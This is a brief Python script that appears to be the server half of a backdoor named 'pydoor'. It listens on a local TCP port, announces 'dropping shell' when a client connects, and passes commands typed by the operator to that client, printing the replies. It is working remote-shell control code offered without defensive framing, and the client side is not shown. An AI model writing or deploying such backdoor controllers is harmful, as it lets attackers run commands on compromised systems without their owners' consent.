#!/usr/bin/env python

import socket
import time
import sys

class Server:

    def __init__(self):
        self.sock = 0
        self.con = 0
        self.host = 0

    def handle_response(self, resp):
        if "pydoor.quit" in resp:
            print("Quit signal received from client " + self.host)
            sys.exit(0) 
        else:
            print(resp)

    

    def start(self):

        print("Starting server")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


        self.sock.bind(("127.0.0.1", 9999))

        self.sock.listen(1)

        while True:
            
            self.con, addr = self.sock.accept()
            rdata = self.con.recv(4096)
            

            if rdata:
                self.host = str(self.sock.getsockname()).strip("(").strip(")").strip(",").replace("'", "") #Remove tuple stuff like parentheses before printing, we dont need any anyways
                
                print(f"Connection received from client, {self.host} dropping shell")
                while True:
                    j = input(">")
                    if j == "":
                        continue
                    self.con.send(j.encode())
                    dat = self.con.recv(4096).decode()
                    self.handle_response(dat.rstrip())

                
if __name__ == "__main__":
    s = Server()

    s.start()